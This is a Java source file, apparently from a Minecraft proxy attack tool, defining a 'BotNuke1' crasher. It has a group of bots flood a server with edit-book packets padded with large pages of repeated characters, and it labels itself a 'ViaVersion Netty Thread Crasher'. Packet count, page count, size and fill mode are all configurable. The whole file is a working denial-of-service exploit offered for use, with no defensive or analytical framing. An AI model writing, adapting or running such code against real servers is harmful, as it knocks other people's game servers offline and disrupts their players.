package us.whitedev.proxy.functions.crashers.impl;

import com.github.steveice10.mc.protocol.packet.ingame.serverbound.inventory.ServerboundEditBookPacket;
import us.whitedev.proxy.functions.crashers.BotCrasher;

import java.util.ArrayList;
import java.util.List;

public class BotNuke1 implements BotCrasher {

    @Override
    public String getName() {
        return "BotNuke1";
    }

    @Override
    public void onMethod(String[] args) {
        int packets = Integer.parseInt(args[0]);
        int pagesAmount = Integer.parseInt(args[1]);
        int size = Integer.parseInt(args[2]);
        String mode = args[3].toUpperCase();

        msgHelper.sendMessage("Bots Starting crashing with &f" + getName(), true);

        for (int i = 0; i < packets; i++) {
            List<String> pages = new ArrayList<>();
            String content;
            switch (mode) {
                case "INDEX" -> content = "{";
                case "NONE" -> content = "x";
                default -> content = ".";
            }
            for (int j = 0; j <= pagesAmount; j++) {
                pages.add(content.repeat(size));
            }

            botsRep.sendPacket(new ServerboundEditBookPacket(-1, pages, "xynis"), true);
        }

        msgHelper.sendMessage("Bots Attacks &asuccessful &7finished!", true);
    }

    @Override
    public String[] getArgsName() {
        return new String[]{"Packets", "Pages", "Size", "Mode[Legacy, Index, None]"};
    }

    @Override
    public String[] getArgsType() {
        return new String[]{"int", "int", "int", "list"};
    }


    @Override
    public String getDescription() {
        return "ViaVersion Netty Thread Crasher";
    }
}
